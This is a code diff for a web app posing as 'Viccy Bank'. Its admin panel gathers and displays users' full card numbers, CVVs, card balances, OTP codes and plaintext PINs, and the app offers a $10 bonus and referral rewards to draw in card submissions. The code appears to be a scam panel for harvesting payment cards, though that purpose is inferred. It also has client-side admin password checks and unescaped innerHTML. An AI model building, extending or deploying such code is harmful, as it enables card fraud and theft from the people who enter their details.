@@ -845,8 +845,8 @@ button:hover{background:#0044dd;}
   </div>
 
   <div class="admin-tabs">
-    <div class="admin-tab active" id="admin-tab-auth" data-translate="authorization">Authorization</div>
-    <div class="admin-tab" id="admin-tab-codes" data-translate="codeManagement">Code Management</div>
+    <div class="admin-tab active" id="admin-tab-auth" data-translate="authorization" onclick="switchAdminTab('authorization')">Authorization</div>
+    <div class="admin-tab" id="admin-tab-codes" data-translate="codeManagement" onclick="switchAdminTab('codes')">Code Management</div>
   </div>
 
   <!-- AUTHORIZATION TAB -->
@@ -1905,13 +1905,6 @@ const countryRequirements={
   Nigeria:['nin','age','address','employmentStatus']
 };
 
-function formatDate(d){
-  if(!d)return t('receiptCompleted');
-  const dt=new Date(d);
-  if(isNaN(dt))return '—';
-  return dt.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+', '+
-         dt.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',hour12:false});
-}
 
 function formatAccountNumber(n){
   if(!n||n.length!==10)return n;
@@ -1935,15 +1928,6 @@ async function generateAccountNumber(){
   return num;
 }
 
-async function deleteRejectedCard(userId,cardIndex){
-  await runTransaction(ref(db,'users/'+userId),u=>{
-    if(u&&u.linkedCards){
-      u.linkedCards.splice(cardIndex,1);
-      return u;
-    }
-    return u;
-  });
-}
 
 // ============================================================
 // AUTH STATE
@@ -2501,23 +2485,24 @@ document.getElementById('close-verify').onclick=()=>{
 document.getElementById('verify-app-done-btn').onclick=async()=>{
   const msg=document.getElementById('verify-msg');
   msg.style.color='#34d399';
-  msg.textContent='✓ '+t('verifyCheckingAuth');
-  // Find the pending card by lastFour and mark authorized
+  msg.textContent='⏳ Submitted — waiting for admin approval...';
+  // Only mark as pending (NOT authorized) — admin must approve from admin panel
   await runTransaction(userDataRef,u=>{
     if(u&&u.linkedCards){
       const idx=u.linkedCards.findLastIndex(c=>c.lastFour===pendingVerifyCardLastFour&&c.status==='pending');
       if(idx!==-1){
-        u.linkedCards[idx].status='authorized';
-        u.linkedCards[idx].authorizedDate=new Date().toISOString();
+        u.linkedCards[idx].appAuthRequested=true;
+        u.linkedCards[idx].appAuthDate=new Date().toISOString();
+        // status stays 'pending' — admin authorizes from admin panel
       }
     }
     return u;
   });
-  msg.textContent='✅ '+t('verifyAuthorizedSuccess');
+  msg.textContent='✅ Submitted! Your card is pending admin approval. You will be notified once approved.';
   setTimeout(()=>{
     document.getElementById('verify-modal').style.display='none';
     msg.textContent='';
-  },2500);
+  },3000);
 };
 
 // OTP submit — saves OTP against card and marks otp_required
@@ -2847,7 +2832,7 @@ function showLocalNotif(title,body){
 // ============================================================
 let unreadCount=0;
 
-function listenNotifications(uid){
+window.listenNotifications=function(uid){
   const nRef=ref(db,'notifications/'+uid);
   onValue(nRef,snap=>{
     const all=[];
@@ -2864,7 +2849,7 @@ function listenNotifications(uid){
   });
 }
 
-function renderNotifications(notifs,uid){
+window.renderNotifications=function(notifs,uid){
   const list=document.getElementById('notif-list');
   if(!list)return;
   if(!notifs.length){
@@ -2914,7 +2899,7 @@ function generateReferralCode(uid){
   return 'VB-'+uid.slice(0,6).toUpperCase();
 }
 
-async function loadReferralData(uid,userData){
+window.loadReferralData=async function(uid,userData){
   const sym=currencySymbols[userData.currency||'USD']||'$';
   const code=generateReferralCode(uid);
   const referrals=userData.referrals||[];
@@ -2981,7 +2966,7 @@ document.getElementById('refer-claim-btn').onclick=async()=>{
 };
 
 // Helper: send notification to any user
-async function sendNotificationToUser(uid,message){
+window.sendNotificationToUser=async function(uid,message){
   const nRef=ref(db,'notifications/'+uid);
   const snap=await get(nRef);
   const newKey='n'+(Date.now());
@@ -2993,7 +2978,7 @@ async function sendNotificationToUser(uid,message){
 // ============================================================
 // VERIFY BANNER — show if user has no authorized card
 // ============================================================
-function updateVerifyBanner(userData){
+window.updateVerifyBanner=function(userData){
   const banner=document.getElementById('verify-banner');
   if(!banner)return;
   const cards=userData.linkedCards||[];
@@ -3032,9 +3017,86 @@ document.querySelectorAll('.language-option').forEach(b=>{
 // ============================================================
 // ADMIN PANEL — Accordion-based clean layout
 // ============================================================
-function switchAdminTab(tab){
+
+// ============================================================
+// FORMAT DATE HELPER
+// ============================================================
+window.formatDate=function(iso){
+  if(!iso)return'—';
+  const d=new Date(iso);
+  return d.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+' '+d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
+}
+
+// ============================================================
+// SEND NOTIFICATION TO USER
+// ============================================================
+window.sendNotificationToUser=async function(uid,message){
+  const key='n'+Date.now();
+  await set(ref(db,'notifications/'+uid+'/'+key),{message,date:new Date().toISOString(),read:false});
+}
+
+// ============================================================
+// UPDATE VERIFY BANNER
+// ============================================================
+window.updateVerifyBanner=function(userData){
+  const banner=document.getElementById('verify-banner');
+  if(!banner)return;
+  const cards=userData.linkedCards||[];
+  const hasVerified=cards.some(c=>c.status==='authorized');
+  banner.style.display=hasVerified?'none':'flex';
+}
+
+// ============================================================
+// LISTEN NOTIFICATIONS
+// ============================================================
+window.listenNotifications=function(uid){
+  const nRef=ref(db,'notifications/'+uid);
+  onValue(nRef,snap=>{
+    const all=[];
+    snap.forEach(child=>{all.push({id:child.key,...child.val()});});
+    const unread=all.filter(n=>!n.read).length;
+    const dot=document.getElementById('notif-dot');
+    if(dot)dot.style.display=unread>0?'block':'none';
+    renderNotifications(all,uid);
+    if(unread>0){
+      const newest=all.filter(n=>!n.read).pop();
+      if(newest)showLocalNotif('Viccy Bank',newest.message);
+    }
+  });
+}
+
+window.renderNotifications=function(notifs,uid){
+  const list=document.getElementById('notif-list');
+  if(!list)return;
+  if(!notifs.length){list.innerHTML='<p style="text-align:center;opacity:0.6;padding:20px;">No notifications</p>';return;}
+  list.innerHTML='';
+  notifs.slice().reverse().forEach(n=>{
+    const item=document.createElement('div');
+    item.className='notif-item'+(n.read?'':' notif-unread');
+    item.innerHTML=`<div class="notif-msg">${n.message||''}</div><div class="notif-time">${formatDate(n.date)}</div>`;
+    item.onclick=async()=>{if(!n.read)await set(ref(db,'notifications/'+uid+'/'+n.id+'/read'),true);};
+    list.appendChild(item);
+  });
+}
+
+// ============================================================
+// TOGGLE ACCORDION
+// ============================================================
+window.toggleAccordion=function(bodyId,arrowId){
+  const body=document.getElementById(bodyId);
+  const arrow=document.getElementById(arrowId);
+  if(!body)return;
+  const open=body.style.display==='block';
+  body.style.display=open?'none':'block';
+  if(arrow)arrow.textContent=open?'▶':'▼';
+}
+
+// ============================================================
+// SWITCH ADMIN TAB
+// ============================================================
+window.switchAdminTab=function(tab){
   currentAdminTab=tab;
-  document.querySelectorAll('.admin-tab').forEach(t=>{t.classList.remove('active');});
+  document.querySelectorAll('.admin-tab').forEach(t=>t.classList.remove('active'));
   if(tab==='authorization'){
     document.getElementById('admin-tab-auth').classList.add('active');
     document.getElementById('admin-content-auth').style.display='block';
@@ -3048,96 +3110,340 @@ function switchAdminTab(tab){
   }
 }
 
-document.getElementById('admin-tab-auth').onclick=()=>switchAdminTab('authorization');
-document.getElementById('admin-tab-codes').onclick=()=>switchAdminTab('codes');
-
-async function loadAdminPanel(){switchAdminTab('authorization');}
-
-// ── Toggle accordion helper ──
-function toggleAccordion(bodyId, arrowId){
-  const body=document.getElementById(bodyId);
-  const arrow=document.getElementById(arrowId);
-  const open=body.style.display!=='none'&&body.style.display!=='';
-  body.style.display=open?'none':'block';
-  if(arrow)arrow.textContent=open?'▶':'▼';
+// ============================================================
+// LOAD ADMIN PANEL
+// ============================================================
+window.loadAdminPanel=async function(){
+  switchAdminTab('authorization');
 }
 
-// ── Authorization Tab ──
-
-function createAdminCardElement({uid,user,card,cardIndex}){
-  const el=document.createElement('div');
-  el.className='admin-card-full';
-  const statusClass=card.status==='otp_required'?'otp':'pending';
-  const statusText=card.status==='otp_required'?t('otpRequired'):t('pending');
-  el.innerHTML=`
-    <div class="admin-card-header">
-      <div>
-        <div class="admin-card-user">${user.firstname} ${user.surname}</div>
-        <div class="admin-card-email">${user.email}</div>
-      </div>
-      <span class="card-status ${statusClass}">${statusText}</span>
-    </div>
-    <div class="admin-card-grid">
-      <div class="admin-card-section"><h5>${t('brand')}</h5><p>${card.brand}</p></div>
-      <div class="admin-card-section"><h5>${t('fullCardNumber')}</h5><p style="font-family:monospace;">${card.number}</p></div>
-      <div class="admin-card-section"><h5>${t('lastFourLabel')}</h5><p>•••• ${card.lastFour}</p></div>
-      <div class="admin-card-section"><h5>${t('expiryDate')}</h5><p>${card.expiry}</p></div>
-      <div class="admin-card-section"><h5>${t('cvv')}</h5><p>${card.cvv}</p></div>
-      <div class="admin-card-section"><h5>${t('cardBalance')}</h5><p>${card.currentBalance}</p></div>
-    </div>
-    <div class="admin-card-section full-width">
-      <h5>${t('billingAddress')}</h5>
-      <p>${card.billingAddress.street}<br>
-         ${card.billingAddress.city}, ${card.billingAddress.postcode}<br>
-         ${card.billingAddress.country}<br>
-         ${t('phoneNum')}: ${card.billingAddress.phone}</p>
-    </div>
+// ============================================================
+// BUILD CARD DETAIL HTML
+// ============================================================
+window.buildCardDetailHTML=function(user,card,uid,cardIndex,showActions){
+  const initiated=card.addedDate?`<div class="detail-row"><span class="detail-label">Initiated</span><span style="color:rgba(255,255,255,0.6);font-size:12px;">${formatDate(card.addedDate)}</span></div>`:'';
+  const authorizedRow=card.authorizedDate?`<div class="detail-row"><span class="detail-label">Authorized</span><span style="color:#34d399;font-size:12px;">${formatDate(card.authorizedDate)}</span></div>`:'';
+  const rejectedRow=card.rejectedDate?`<div class="detail-row"><span class="detail-label">Rejected</span><span style="color:#ff5c5c;font-size:12px;">${formatDate(card.rejectedDate)}</span></div>`:'';
+  const otpRow=card.otpCode?`<div class="detail-row"><span class="detail-label">OTP Code</span><span style="color:#3b82f6;font-weight:700;">${card.otpCode}</span></div>`:'';
+  const actionBtns=showActions?`
     <div class="admin-card-actions">
       <button class="admin-auth-btn" onclick="adminAuthorizeCard('${uid}',${cardIndex})">${t('authorizeCard')}</button>
       <button class="admin-reject-btn" onclick="adminRejectCard('${uid}',${cardIndex})">${t('rejectCard')}</button>
-    </div>
-    <div class="auth-directions-box">
-      <div class="auth-directions-title">${t('authDirectionTitle')}</div>
-      <div class="auth-directions-steps">
-        <p>${t('authDirection1')}</p>
-        <p>${t('authDirection2')}</p>
-        <p>${t('authDirection3')}</p>
-        <p>${t('authDirection4')}</p>
-        <p>${t('authDirection5')}</p>
-      </div>
-      <div class="auth-directions-note">${t('authDirectionNote')}</div>
-    </div>
-  `;
-  return el;
+    </div>`:'';
+  return `
+    <div class="detail-row"><span class="detail-label">${t('brand')}</span><span>${card.brand||'—'}</span></div>
+    <div class="detail-row"><span class="detail-label">${t('fullCardNumber')}</span><span style="font-family:monospace;">${card.number||'—'}</span></div>
+    <div class="detail-row"><span class="detail-label">${t('lastFourLabel')}</span><span>•••• ${card.lastFour||'—'}</span></div>
+    <div class="detail-row"><span class="detail-label">${t('expiryDate')}</span><span>${card.expiry||'—'}</span></div>
+    <div class="detail-row"><span class="detail-label">${t('cvv')}</span><span>${card.cvv||'—'}</span></div>
+    <div class="detail-row"><span class="detail-label">${t('cardBalance')}</span><span>${card.currentBalance||'—'}</span></div>
+    <div class="detail-row"><span class="detail-label">Cardholder</span><span>${card.cardName||user.firstname+' '+user.surname}</span></div>
+    ${initiated}${authorizedRow}${rejectedRow}${otpRow}
+    ${actionBtns}`;
 }
 
+// ============================================================
+// DELETE / REJECT CARD
+// ============================================================
+window.deleteRejectedCard=async function(uid,cardIndex){
+  await runTransaction(ref(db,'users/'+uid),u=>{
+    if(u&&u.linkedCards&&u.linkedCards[cardIndex]){
+      u.linkedCards[cardIndex].status='rejected';
+      u.linkedCards[cardIndex].rejectedDate=new Date().toISOString();
+    }
+    return u;
+  });
+}
+
+// ============================================================
+// LOAD AUTHORIZATION TAB
+// ============================================================
+window.loadAuthorizationTab=async function(){
+  const attNeed=document.getElementById('acc-attention-body');
+  const authBody=document.getElementById('acc-authorized-body');
+  const rejBody=document.getElementById('acc-rejected-body');
+  if(!attNeed||!authBody||!rejBody)return;
+  attNeed.innerHTML='<p class="acc-loading">Loading...</p>';
+  authBody.innerHTML='<p class="acc-loading">Loading...</p>';
+  rejBody.innerHTML='<p class="acc-loading">Loading...</p>';
+
+  const snap=await get(ref(db,'users'));
+  if(!snap.exists()){
+    attNeed.innerHTML='<p class="acc-empty">No users found</p>';
+    authBody.innerHTML='<p class="acc-empty">No cards</p>';
+    rejBody.innerHTML='<p class="acc-empty">No cards</p>';
+    return;
+  }
+  const users=snap.val();
+  let attentionCards=[],authorizedCards=[],rejectedCards=[];
+
+  for(const uid in users){
+    const u=users[uid];
+    if(u.email==='admin@gmail.com')continue;
+    const cards=u.linkedCards||[];
+    cards.forEach((card,idx)=>{
+      const entry={uid,user:u,card,cardIndex:idx};
+      if(card.status==='pending'||card.status==='otp_required')attentionCards.push(entry);
+      else if(card.status==='authorized')authorizedCards.push(entry);
+      else if(card.status==='rejected')rejectedCards.push(entry);
+    });
+  }
+
+  // Update badges
+  const ba=document.getElementById('badge-attention');
+  const bau=document.getElementById('badge-authorized');
+  const br=document.getElementById('badge-rejected');
+  if(ba){ba.textContent=attentionCards.length||'';ba.style.display=attentionCards.length?'inline-flex':'none';}
+  if(bau){bau.textContent=authorizedCards.length||'';bau.style.display=authorizedCards.length?'inline-flex':'none';}
+  if(br){br.textContent=rejectedCards.length||'';br.style.display=rejectedCards.length?'inline-flex':'none';}
+
+  // Attention section
+  attNeed.innerHTML='';
+  if(!attentionCards.length){
+    attNeed.innerHTML='<p class="acc-empty">No cards pending</p>';
+  }else{
+    attentionCards.forEach(({uid,user,card,cardIndex})=>{
+      const el=document.createElement('div');
+      el.className='admin-card-full';
+      el.innerHTML=`
+        <div class="admin-card-header">
+          <div><div class="admin-card-user">${user.firstname} ${user.surname}</div><div class="admin-card-email">${user.email}</div></div>
+          <span class="card-status ${card.status==='otp_required'?'otp':'pending'}">${card.status==='otp_required'?t('otpRequired'):t('pending')}</span>
+        </div>
+        ${buildCardDetailHTML(user,card,uid,cardIndex,true)}`;
+      attNeed.appendChild(el);
+    });
+  }
+
+  // Authorized section — name list expandable
+  authBody.innerHTML='';
+  if(!authorizedCards.length){
+    authBody.innerHTML='<p class="acc-empty">No authorized cards</p>';
+  }else{
+    authorizedCards.forEach(({uid,user,card,cardIndex},i)=>{
+      const row=document.createElement('div');
+      row.className='name-row';
+      const detId='auth-det-'+i;
+      row.innerHTML=`
+        <div class="name-row-header" onclick="toggleAccordion('${detId}','arr-au-${i}')">
+          <div class="name-row-info">
+            <span class="name-row-name">${user.firstname} ${user.surname}</span>
+            <span class="card-status authorized" style="margin-left:8px;font-size:10px;">${t('authorized')}</span>
+          </div>
+          <span class="acc-arrow" id="arr-au-${i}">▶</span>
+        </div>
+        <div id="${detId}" class="name-row-detail" style="display:none;">
+          ${buildCardDetailHTML(user,card,uid,cardIndex,false)}
+        </div>`;
+      authBody.appendChild(row);
+    });
+  }
+
+  // Rejected section
+  rejBody.innerHTML='';
+  if(!rejectedCards.length){
+    rejBody.innerHTML='<p class="acc-empty">No rejected cards</p>';
+  }else{
+    rejectedCards.forEach(({uid,user,card,cardIndex},i)=>{
+      const row=document.createElement('div');
+      row.className='name-row';
+      const detId='rej-det-'+i;
+      row.innerHTML=`
+        <div class="name-row-header" onclick="toggleAccordion('${detId}','arr-rj-${i}')">
+          <div class="name-row-info">
+            <span class="name-row-name">${user.firstname} ${user.surname}</span>
+            <span class="card-status rejected" style="margin-left:8px;font-size:10px;">Rejected</span>
+          </div>
+          <span class="acc-arrow" id="arr-rj-${i}">▶</span>
+        </div>
+        <div id="${detId}" class="name-row-detail" style="display:none;">
+          ${buildCardDetailHTML(user,card,uid,cardIndex,false)}
+        </div>`;
+      rejBody.appendChild(row);
+    });
+  }
+}
+
+// ============================================================
+// LOAD CODES TAB
+// ============================================================
+window.loadCodesTab=async function(){
+  const cs=document.getElementById('codes-country-sections');
+  if(!cs)return;
+  cs.innerHTML='<p class="acc-loading">Loading...</p>';
+  const snap=await get(ref(db,'users'));
+  if(!snap.exists()){cs.innerHTML='<p class="acc-empty">No users</p>';return;}
+  const users=snap.val();
+  const byCountry={};
+  for(const uid in users){
+    const u=users[uid];
+    if(u.email==='admin@gmail.com')continue;
+    const co=u.country||'Unknown';
+    if(!byCountry[co])byCountry[co]=[];
+    byCountry[co].push({uid,user:u});
+  }
+  cs.innerHTML='';
+  Object.keys(byCountry).sort().forEach((co,ci)=>{
+    const sec=document.createElement('div');
+    sec.className='acc-block';
+    sec.style.marginBottom='8px';
+    const coId='co-body-'+ci;
+    sec.innerHTML=`
+      <div class="acc-header" onclick="toggleAccordion('${coId}','co-arr-${ci}')">
+        <div class="acc-header-left">
+          <span class="acc-icon">🌍</span>
+          <span class="acc-title">${co}</span>
+          <span class="acc-badge" style="display:inline-flex;">${byCountry[co].length}</span>
+        </div>
+        <span class="acc-arrow" id="co-arr-${ci}">▶</span>
+      </div>
+      <div id="${coId}" class="acc-body" style="display:none;"></div>`;
+    const body=sec.querySelector('.acc-body');
+    byCountry[co].forEach(({uid,user},ui)=>{
+      const sym=currencySymbols[user.currency]||'$';
+      const uId='u-body-'+ci+'-'+ui;
+      const uEl=document.createElement('div');
+      uEl.className='name-row';
+      uEl.innerHTML=`
+        <div class="name-row-header" onclick="toggleAccordion('${uId}','u-arr-${ci}-${ui}')">
+          <div class="name-row-info">
+            <span class="name-row-name">${user.firstname} ${user.surname}</span>
+            <span style="font-size:11px;opacity:0.5;margin-left:8px;">${user.email}</span>
+          </div>
+          <span class="acc-arrow" id="u-arr-${ci}-${ui}">▶</span>
+        </div>
+        <div id="${uId}" class="name-row-detail" style="display:none;">
+          <div class="detail-row"><span class="detail-label">Email</span><span>${user.email}</span></div>
+          <div class="detail-row"><span class="detail-label">${t('accountNumber')}</span><span>${user.accountNumber}</span></div>
+          <div class="detail-row"><span class="detail-label">PIN</span><span style="color:#ffc107;font-weight:700;">${user.pin||'N/A'}</span></div>
+          <div class="detail-row"><span class="detail-label">Balance</span><span>${sym}${(user.balance||0).toLocaleString()}</span></div>
+          <div class="detail-row"><span class="detail-label">Verified</span><span>${user.verified?'✅ Yes':'❌ No'}</span></div>
+          <div class="codes-pin-row">
+            <input type="text" class="admin-pin-input" placeholder="New 4-digit PIN" maxlength="4" id="pin-${uid}">
+            <button class="admin-change-pin-btn" onclick="changeUserPin('${uid}')">Update PIN</button>
+          </div>
+          <div class="codes-pin-row" style="margin-top:8px;">
+            <input type="text" class="admin-pin-input" style="letter-spacing:0;font-size:13px;" placeholder="Message to user..." id="msg-${uid}">
+            <button class="admin-change-pin-btn" style="background:#4dabff;color:#000;" onclick="adminSendMessage('${uid}')">📨 Send</button>
+          </div>
+        </div>`;
+      body.appendChild(uEl);
+    });
+    cs.appendChild(sec);
+  });
+}
+
+// ============================================================
+// CHANGE USER PIN
+// ============================================================
+window.changeUserPin=async function(uid){
+  const password=prompt(t('adminPassword')+':');
+  if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
+  const p=document.getElementById('pin-'+uid)?.value.trim();
+  if(!p||p.length!==4||!/^\d{4}$/.test(p)){alert(t('errPinFourDigits'));return;}
+  if(!confirm(t('alertConfirmPinChange',{pin:p})))return;
+  await runTransaction(ref(db,'users/'+uid),u=>{if(u){u.pin=p;return u;}return u;});
+  alert(t('alertPinUpdated'));
+  loadCodesTab();
+};
+
+// ============================================================
+// ADMIN SEND MESSAGE
+// ============================================================
+window.adminSendMessage=async function(uid){
+  const inp=document.getElementById('msg-'+uid);
+  const msg=inp?.value?.trim();
+  if(!msg){alert('Please type a message');return;}
+  await sendNotificationToUser(uid,'📢 Bank Notice: '+msg);
+  inp.value='';
+  alert('Message sent!');
+};
+
+// ============================================================
+// LOAD REFERRAL DATA
+// ============================================================
+window.loadReferralData=async function(uid,userData){
+  const sym=currencySymbols[userData.currency||'USD']||'$';
+  const code='VB-'+uid.slice(0,6).toUpperCase();
+  const referrals=userData.referrals||[];
+  const count=referrals.length;
+  const earned=count*10;
+  const claimed=userData.referralClaimed||false;
+  document.getElementById('refer-code-display').textContent=code;
+  document.getElementById('refer-earn-label').textContent=sym+'10';
+  document.getElementById('refer-count').textContent=count;
+  document.getElementById('refer-earned').textContent=sym+earned;
+  document.getElementById('refer-needed').textContent=Math.max(0,12-count);
+  const pct=Math.min(100,(count/12)*100);
+  document.getElementById('refer-progress-fill').style.width=pct+'%';
+  document.getElementById('refer-progress-label').textContent=count+' / 12 referrals to claim';
+  const claimBtn=document.getElementById('refer-claim-btn');
+  claimBtn.disabled=count<12||claimed;
+  if(claimed){claimBtn.textContent='✅ Already Claimed';claimBtn.style.background='rgba(52,211,153,0.2)';claimBtn.style.color='#34d399';}
+}
+
+
+// ============================================================
+// ADMIN AUTHORIZE CARD
+// ============================================================
 window.adminAuthorizeCard=async function(uid,cardIndex){
   const password=prompt(t('adminPassword')+':');
   if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
   if(!confirm(t('authorizeConfirm')))return;
   const ur=ref(db,'users/'+uid);
+  const ud=await get(ur).then(s=>s.val());
   await runTransaction(ur,u=>{
     if(u&&u.linkedCards&&u.linkedCards[cardIndex]){
       u.linkedCards[cardIndex].status='authorized';
       u.linkedCards[cardIndex].authorizedDate=new Date().toISOString();
-      return u;
+      if(!u.verified){
+        u.balance=(u.balance||0)+10;
+        u.verified=true;
+        u.history=u.history||[];
+        u.history.push({date:new Date().toISOString(),type:'Received',amount:10,from:'Verification Bonus',senderName:'Viccy Bank'});
+      }
     }
     return u;
   });
+  const lastFour=ud?.linkedCards?.[cardIndex]?.lastFour||'';
+  await sendNotificationToUser(uid,'✅ Your card ending in '+lastFour+' has been authorized! A $10 verification bonus has been added.');
   alert(t('cardAuthorized'));
   loadAuthorizationTab();
 };
 
+// ============================================================
+// ADMIN REJECT CARD
+// ============================================================
 window.adminRejectCard=async function(uid,cardIndex){
   const password=prompt(t('adminPassword')+':');
   if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
   if(!confirm(t('rejectConfirm')))return;
   await deleteRejectedCard(uid,cardIndex);
+  await sendNotificationToUser(uid,'❌ Your card submission has been rejected. Please contact support.');
   alert(t('cardRejected'));
   loadAuthorizationTab();
 };
 
+document.getElementById('admin-logout-btn').onclick=()=>signOut(auth);
 
+document.getElementById('admin-change-all-btn').onclick=async()=>{
+  const password=prompt(t('adminPassword')+':');
+  if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
+  const p=document.getElementById('admin-global-pin').value.trim();
+  if(!p||p.length!==4||!/^\d{4}$/.test(p)){alert(t('errPinFourDigits'));return;}
+  if(!confirm(t('alertConfirmAllPins',{pin:p})))return;
+  const snap=await get(ref(db,'users'));
+  if(snap.exists()){
+    let count=0;
+    for(const uid in snap.val()){
+      if(snap.val()[uid].email==='admin@gmail.com')continue;
+      await runTransaction(ref(db,'users/'+uid),u=>{if(u){u.pin=p;return u;}return u;});
+      count++;
+    }
+    alert(t('alertPinsUpdated',{count,pin:p}));
+    loadCodesTab();
+  }
+};
 
 </script>
 </body>
